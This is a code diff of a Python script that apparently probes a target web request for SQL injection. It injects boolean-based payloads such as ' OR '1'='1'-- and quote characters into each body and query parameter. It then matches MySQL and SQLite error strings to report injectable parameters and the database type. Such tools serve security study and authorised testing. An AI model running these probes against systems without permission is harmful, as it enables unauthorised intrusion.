@@ -1,6 +1,68 @@
+from ast import pattern
 import requests
 import argparse
 import re
+
+###
+#def only_new_content(base_html: str, other_html: str) -> str:
+	# base_set = set(_to_lines(_normalize_html(base_html)))
+	# other_lines = _to_lines(_normalize_html(other_html))
+	# diff_lines = ["\033[92m" + ln + "\033[0m" if ln not in base_set else "=" for ln in other_lines]
+
+	# merged_lines = []
+	# buffer = []
+	# for line in diff_lines:
+	# 	if line == "=":
+	# 		buffer.append(line)
+	# 	else:
+	# 		if buffer:
+	# 			merged_lines.append("=".join(buffer))
+	# 			buffer = []
+	# 		merged_lines.append(line)
+	# if buffer:
+	# 	merged_lines.append("=".join(buffer))
+	# diff_lines = merged_lines
+
+	# return '\n'.join(diff_lines)
+###
+
+boolean_detection = {
+	"' AND '1'='1'--%20" : "' AND '1'='2'--%20",
+	"' AND '1'='2'--%20" : "' AND '1'='1'--%20",
+    "' OR '1'='1'--%20" : "' OR '1'='2'--%20",
+    "' OR '1'='2'--%20" : "' OR '1'='1'--%20"
+}
+
+error_based_detection = [
+    "'",    # generic quote
+    "\"",   # double quote
+    ")",    # close parenthesis
+    "';",   # quote + semicolon
+]
+
+error_patterns = {
+	"mysql": [
+		"You have an error in your SQL syntax;",
+		"Warning: mysql_",
+		"MySQL server version for the right syntax",
+		"mysqli_fetch",
+		"mysql_fetch",
+		"mysql_num_rows",
+		"mysql_query()",
+		"supplied argument is not a valid MySQL",
+		"Syntax error or access violation"
+	],
+	"sqlite": [
+		"SQLite3::query(): Unable to prepare statement",
+		"SQLite3::exec(): Unable to prepare statement",
+		"SQLITE_ERROR",
+		"unrecognized token:",
+		"near \"",
+		"syntax error",
+		"no such table",
+		"no such column"
+	]
+}
 
 # --------- INPUT PARSING --------- #
 def parse_args():
@@ -56,13 +118,10 @@ def extract_base_url(full_url: str) -> str:
 
 
 # --------- REQUESTS --------- #
-def request_record(method: str, full_url: str, headers: dict, body_string: str) -> dict:
+def request_record(method: str, full_url: str, headers: dict, body_string: str, infected_param: str | None = None,
+				   infected_type: str | None = None, infected_payload: str | None = None) -> dict:
 	request = requests.request(method, full_url, headers=headers, data=body_string if method == "POST" else None)
 	time = request.elapsed.total_seconds()
-	for _ in range(10):
-		req = requests.request(method, full_url, headers=headers, data=body_string if method == "POST" else None)
-		if req.elapsed.total_seconds() > time:
-			time = req.elapsed.total_seconds()
 
 	return {
 		"body": body_params(body_string),
@@ -71,25 +130,42 @@ def request_record(method: str, full_url: str, headers: dict, body_string: str) 
 			"status_code": request.status_code,
 			"content": request.content.decode(),
 			"time": time
-		}
+		},
+		"infected_param": infected_param if infected_param else None,
+		"infected_type": infected_type if infected_type else None,
+		"infected_payload": infected_payload if infected_payload else None
 	}
 
 def detection_request_records(method: str, full_url: str, headers: dict, _body_string: str) -> list[dict]:
 	_body_params = body_params(_body_string)
 	_query_params = query_params(extract_query_string(full_url))
-	params = list(_body_params.keys()) + list(_query_params.keys())
 
 	detection_request_records = []
 
-	for param in params:
+	for param in _body_params.keys():
 		body_params_copy = _body_params.copy()
-		query_params_copy = _query_params.copy()
-		if param in body_params_copy:
-			body_params_copy[param] = "INJECTED"
-		if param in query_params_copy:
-			query_params_copy[param] = "INJECTED"
+		for error_based in error_based_detection:
+			body_params_copy[param] = error_based
+			detection_request_records.append(request_record(method, assemble_full_url(
+				extract_base_url(full_url), query_string(_query_params)), headers, body_string(body_params_copy), param, "error_based", error_based))
 
-		detection_request_records.append(request_record(method, assemble_full_url(extract_base_url(full_url), query_string(query_params_copy)), headers, body_string(body_params_copy)))
+		for boolean in boolean_detection:
+			body_params_copy[param] = _body_params[param] + boolean
+			detection_request_records.append(request_record(method, assemble_full_url(
+				extract_base_url(full_url), query_string(_query_params)), headers, body_string(body_params_copy), param, f"boolean_based", boolean))
+
+
+	for param in _query_params.keys():
+		query_params_copy = _query_params.copy()
+		for error_based in error_based_detection:
+			query_params_copy[param] = error_based
+			detection_request_records.append(request_record(method, assemble_full_url(
+				extract_base_url(full_url), query_string(query_params_copy)), headers, body_string(_body_params), param, "error_based", error_based))
+
+		for boolean in boolean_detection:
+			query_params_copy[param] = _query_params[param] + boolean
+			detection_request_records.append(request_record(method, assemble_full_url(
+				extract_base_url(full_url), query_string(query_params_copy)), headers, body_string(_body_params), param, f"boolean_based", boolean))
 
 	return detection_request_records
 # ----------------------- #
@@ -108,36 +184,73 @@ def _to_lines(s: str) -> list[str]:
     return lines
 
 def only_new_content(base_html: str, other_html: str) -> str:
-    base_set = set(_to_lines(_normalize_html(base_html)))
-    other_lines = _to_lines(_normalize_html(other_html))
-    diff_lines = [ln for ln in other_lines if ln not in base_set]
-    return '\n'.join(diff_lines)
+	base_set = set(_to_lines(_normalize_html(base_html)))
+	other_lines = _to_lines(_normalize_html(other_html))
+	diff_lines = [ln for ln in other_lines if ln not in base_set]
+	return '\n'.join(diff_lines)
+
+def parse_detection_records(records: dict) -> list[dict]:
+	detection_records = []
+	for record in records["detections"]:
+		record["response"]["content"] = only_new_content(records["default"]["response"]["content"], record["response"]["content"])
+		detection_records.append(record)
+	return detection_records
+# ----------------------- #
+
+
+# --------- ANALYSE RECORDS --------- #
+def get_boolean_record(records: list[dict], payload: str) -> dict | None:
+	for record in records:
+		if record["infected_type"] == "boolean_based" and record["infected_payload"] == payload:
+			return record
+	return None
+
+def get_boolean_record_pair(records: list[dict], record: dict):
+	pair_payload = boolean_detection[record["infected_payload"]]
+	return get_boolean_record(records, pair_payload)
+
+def get_injection_points(records: list[dict]) -> tuple[set, str | None]:
+	injection_points = set()
+	db_type = None
+
+	for record in records:
+		if record["infected_type"] == "error_based":
+			if any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns["mysql"]):
+				injection_points.add(record["infected_param"])
+				db_type = "MySQL"
+			elif any(re.search(pattern, record["response"]["content"], re.IGNORECASE) for pattern in error_patterns["sqlite"]):
+				injection_points.add(record["infected_param"])
+				db_type = "SQLite"
+				print("SQLite error detected")
+		elif record["infected_type"] == "boolean_based":
+			if get_boolean_record_pair(records, record)["response"]["content"] != record["response"]["content"]:
+				print("Boolean error detected")
+
+	if injection_points:
+		print(f"\n[!] Potential SQL Injection points detected ({len(injection_points)}):\n")
+	else:
+		print("\n[-] No SQL Injection points detected.\n")
+
+	return injection_points, db_type
 # ----------------------- #
 
 
 
-def print_records(default_record: dict, detection_records: list[dict]):
-	print("\n[+] Default Request Record:")
-	print("  - Body Parameters:", default_record["body"])
-	print("  - Query Parameters:", default_record["query"])
-	print("  - Response Status Code:", default_record["response"]["status_code"])
-	print("  - Response Time (s):", default_record["response"]["time"])
-	content = default_record["response"]["content"]
-	print("  - Response new content:\n\033[93m", content, "\033[0m\n")
+def print_record(record: dict, index: int | str, filter, base_content = None):
+	print(f" Record {index}:")
+	if record["infected_param"]:
+		print("  - Infected Parameter:", record["infected_param"])
+		print("  - Infected Method:", record["infected_type"])
+		print("  - Infected Payload:", record["infected_payload"])
+	print("  - Body Parameters:", record["body"])
+	print("  - Query Parameters:", record["query"])
+	print("  - Response Status Code:", record["response"]["status_code"])
+	print("  - Response Time (s):", record["response"]["time"])
+	if base_content:
+		print(f"  - Response new content:\n{filter(base_content, record['response']['content'])} \033[0m\n")
+	else:
+		print(f"  - Response new content:\n{filter(record['response']['content'])} \033[0m\n")
 	print("\n")
-
-	print("[+] Detection Request Records:")
-	for i, record in enumerate(detection_records):
-
-		print(f"  Record {i}:")
-		print("    - Body Parameters:", record["body"])
-		print("    - Query Parameters:", record["query"])
-		print("    - Response Status Code:", record["response"]["status_code"])
-		print("    - Response Time (s):", record["response"]["time"])
-		content = record["response"]["content"]
-		print("    - Response new content:\n\033[93m", only_new_content(default_record["response"]["content"], content), "\033[0m\n")
-		print("\n")
-
 
 def main():
 	method, url, headers, body = parse_args()
@@ -147,10 +260,14 @@ def main():
 			"default": request_record(method, url, headers, body),
 			"detections": detection_request_records(method, url, headers, body)
 		}
-		# To be continued...
-		# Print the records body and query parameters
 
-		print_records(records["default"], records["detections"])
+		print_record(records["default"], 0, str)
+		for i, record in enumerate(records["detections"], 1):
+			print_record(record, i, only_new_content, records["default"]["response"]["content"])
+		detection_records = parse_detection_records(records)
+		injection_points, db_type = get_injection_points(detection_records)
+		print("Injection Points:", injection_points)
+		print("Database Type:", db_type)
 
 	except requests.RequestException as e:
 		print("[!] An error occurred while making the requests:", e)
